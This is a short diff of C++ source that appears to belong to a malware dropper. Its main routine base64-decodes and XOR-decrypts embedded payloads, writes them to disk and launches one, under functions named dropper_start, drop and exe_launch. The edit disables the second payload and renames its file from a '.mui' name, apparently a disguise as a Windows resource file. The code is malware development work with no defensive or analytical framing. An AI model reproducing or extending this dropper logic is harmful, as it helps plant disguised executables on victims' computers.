@@ -176,20 +176,20 @@ int main(int argc, char* argv[])
 
 #else
 		dropper_start(1);
-		dropper_start(2);
+//		dropper_start(2);
 
 	#ifdef DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
-		data2 = base64decode(data2, &size2);
+//		data2 = base64decode(data2, &size2);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
 		data1 = XOR(data1, size1);
-		data2 = XOR(data2, size2);
+//		data2 = XOR(data2, size2);
 	#endif
 
 		drop(size1, data1, name1);
-		drop(size2, data2, name2);
+//		drop(size2, data2, name2);
 
 		exe_launch(name1);
 
@@ -375,7 +375,8 @@ void set_name(std::uint64_t os_version)
 
 	name1+=out;
 	name2+=out;
-	name2+=L".mui";
+	name2+=L"2";
+	//name2+=L".mui";
 
 #endif
 	}
